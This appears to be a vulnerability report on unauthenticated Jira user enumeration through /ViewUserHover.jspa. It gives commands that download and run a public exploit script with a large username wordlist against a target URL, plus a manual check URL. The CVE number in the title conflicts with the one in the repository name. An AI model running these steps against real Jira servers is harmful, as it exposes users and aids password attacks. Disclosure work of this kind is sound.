# Jira user enumeration using CVE-2020-1481

## Summary

Affected versions of Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUserHover.jspa endpoint.

Affected versions:

-   version < 7.13.16
**-   8.0.0 ≤ version < 8.5.7**
-   8.6.0 ≤ version < 8.12.0

Your Jira instance is version v8.5.3. 

## Steps To Reproduce

 1. Download the python file 
``wget https://raw.githubusercontent.com/Rival420/CVE-2020-14181/main/cve-2020-1481.py``
2. Download a username file list
``wget https://github.com/danielmiessler/SecLists/raw/master/Usernames/xato-net-10-million-usernames.txt``
3. Run it in the following way
``python3 cve-2020-1481.py -u $URL -w xato-net-10-million-usernames.txt
``

This is the output you will get (after running it for 30 mins or so) 
```

vulnurl = $URLsecure/ViewUserHover.jspa?username=
wordlist = xato-net-10-million-usernames.txt

$OUTPUT

```
You can manually validate the user's existence using the following url:
$URL/secure/ViewUserHover.jspa?username=ptaylor
(change **ptaylor** for another user you might want to check)

## Impact
All obtained users are valid users of the Jira installation, some provide full name of the user.  It also affects confidentiality of the system. Knowing usernames before hand would help and attacker to get valid credentials brute forcing for passwords.
